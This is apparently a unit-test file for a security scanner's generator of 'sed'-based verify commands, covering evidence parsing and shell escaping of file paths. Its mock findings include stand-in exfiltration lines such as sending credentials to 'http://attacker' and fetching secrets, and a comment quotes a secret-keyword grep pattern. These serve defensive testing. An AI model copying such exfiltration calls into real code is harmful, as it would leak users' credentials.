/**
 * Deterministic unit tests for the #141 verify-command generator. Runs in
 * CI without spawn, fixture, or shell — gates the generator's data-driven
 * contract. Pairs with line-population tests at
 * `__tests__/hardening/soul-emit-line-population.test.ts` (regex emit
 * sites) and the corpus-gated release-smoke harness (Verify execution
 * against real fixtures).
 */

import { describe, it, expect } from "vitest";
import type { Evidence } from "../../src/types/finding-evidence";
import {
  firstLineFromEvidence,
  generateVerifyCommand,
  shellEscapePath,
} from "../../src/ui/verify-command";

describe("firstLineFromEvidence (#141)", () => {
  it("returns the first cited line on positive evidence", () => {
    const e: Evidence = {
      kind: "positive",
      lines: [
        { n: 12, content: "send(creds, 'http://attacker')", why: "exfil" },
        { n: 30, content: "log(creds)", why: "leak" },
      ],
    };
    expect(firstLineFromEvidence(e)).toBe(12);
  });

  it("returns the first observed line on absence evidence", () => {
    const e: Evidence = {
      kind: "absence",
      observed: {
        lines: [{ n: 7, content: "shell.exec(input)" }],
        summary: "high-risk capability without governance",
      },
      expected: [{ constraint: "input-validation", rationale: "..." }],
    };
    expect(firstLineFromEvidence(e)).toBe(7);
  });

  it("returns the positive half's first line on mixed evidence", () => {
    const e: Evidence = {
      kind: "mixed",
      positive: {
        lines: [{ n: 4, content: "fetch(secrets)", why: "exfil" }],
      },
      absence: {
        observed: { lines: [{ n: 18, content: "fs.write" }], summary: "x" },
        expected: [{ constraint: "y", rationale: "z" }],
      },
    };
    expect(firstLineFromEvidence(e)).toBe(4);
  });

  it("returns undefined when evidence is undefined", () => {
    expect(firstLineFromEvidence(undefined)).toBeUndefined();
  });

  it("returns undefined when positive lines array is empty", () => {
    const e: Evidence = { kind: "positive", lines: [] };
    expect(firstLineFromEvidence(e)).toBeUndefined();
  });

  it("returns undefined when absence observed.lines is empty", () => {
    const e: Evidence = {
      kind: "absence",
      observed: { lines: [], summary: "summary-only absence" },
      expected: [{ constraint: "c", rationale: "r" }],
    };
    expect(firstLineFromEvidence(e)).toBeUndefined();
  });
});

describe("generateVerifyCommand (#141)", () => {
  it("emits sed -n on file + evidence.lines[0].n", () => {
    expect(
      generateVerifyCommand({
        file: "src/leaky.ts",
        evidence: {
          kind: "positive",
          lines: [{ n: 42, content: "send(token)", why: "exfil" }],
        },
      })
    ).toBe("sed -n '42p' 'src/leaky.ts'");
  });

  it("falls back to legacy f.line when evidence is absent", () => {
    expect(
      generateVerifyCommand({ file: ".clinerules", line: 3 })
    ).toBe("sed -n '3p' '.clinerules'");
  });

  it("prefers evidence.lines[0].n over f.line when both are present", () => {
    expect(
      generateVerifyCommand({
        file: "a.ts",
        line: 99,
        evidence: {
          kind: "positive",
          lines: [{ n: 7, content: "x", why: "y" }],
        },
      })
    ).toBe("sed -n '7p' 'a.ts'");
  });

  it("returns undefined when neither evidence nor line is present", () => {
    expect(
      generateVerifyCommand({ file: "src/x.ts" })
    ).toBeUndefined();
  });

  it("returns undefined when file is missing even with a line", () => {
    expect(
      generateVerifyCommand({ line: 10 })
    ).toBeUndefined();
  });

  it("returns undefined when line is zero (1-based contract)", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: 0 })
    ).toBeUndefined();
  });

  it("returns undefined when line is negative", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: -3 })
    ).toBeUndefined();
  });

  it("returns undefined when line is non-integer", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: 3.5 })
    ).toBeUndefined();
  });

  it("returns undefined when path contains control characters", () => {
    expect(
      generateVerifyCommand({ file: "src/\nbad.ts", line: 5 })
    ).toBeUndefined();
  });

  it("escapes single quotes in paths", () => {
    expect(
      generateVerifyCommand({ file: "src/it's.ts", line: 5 })
    ).toBe("sed -n '5p' 'src/it'\\''s.ts'");
  });

  it("emits no category-template fallbacks (governance, mcp, credential)", () => {
    // Governance-class finding without line — pre-#141 returned
    // 'hackmyagent scan-soul . --verbose'. Now must return undefined.
    expect(
      generateVerifyCommand({
        file: "SOUL.md",
        // checkId/category/attackClass are no longer read by the generator,
        // but the no-line case must still produce no Verify regardless.
      })
    ).toBeUndefined();
  });

  it("emits no credential-grep fallback (the .clinerules:3 user repro)", () => {
    // Pre-#141 behaviour for a credential finding without a line was:
    //   grep -in "key|token|secret|password" '.clinerules'
    // which returned 16 unrelated matches on the kitchen-sink fixture.
    // Now: undefined. Renderer omits the Verify line entirely.
    expect(
      generateVerifyCommand({ file: ".clinerules" })
    ).toBeUndefined();
  });
});

describe("shellEscapePath (#141)", () => {
  it("returns undefined on tab characters", () => {
    expect(shellEscapePath("a\tb")).toBeUndefined();
  });

  it("returns undefined on null bytes", () => {
    expect(shellEscapePath("a\0b")).toBeUndefined();
  });

  it("returns undefined on DEL character", () => {
    expect(shellEscapePath("a\x7fb")).toBeUndefined();
  });

  it("escapes embedded single quotes correctly", () => {
    expect(shellEscapePath("o'reilly.md")).toBe("'o'\\''reilly.md'");
  });

  it("wraps an ordinary path in single quotes", () => {
    expect(shellEscapePath("src/cli.ts")).toBe("'src/cli.ts'");
  });
});
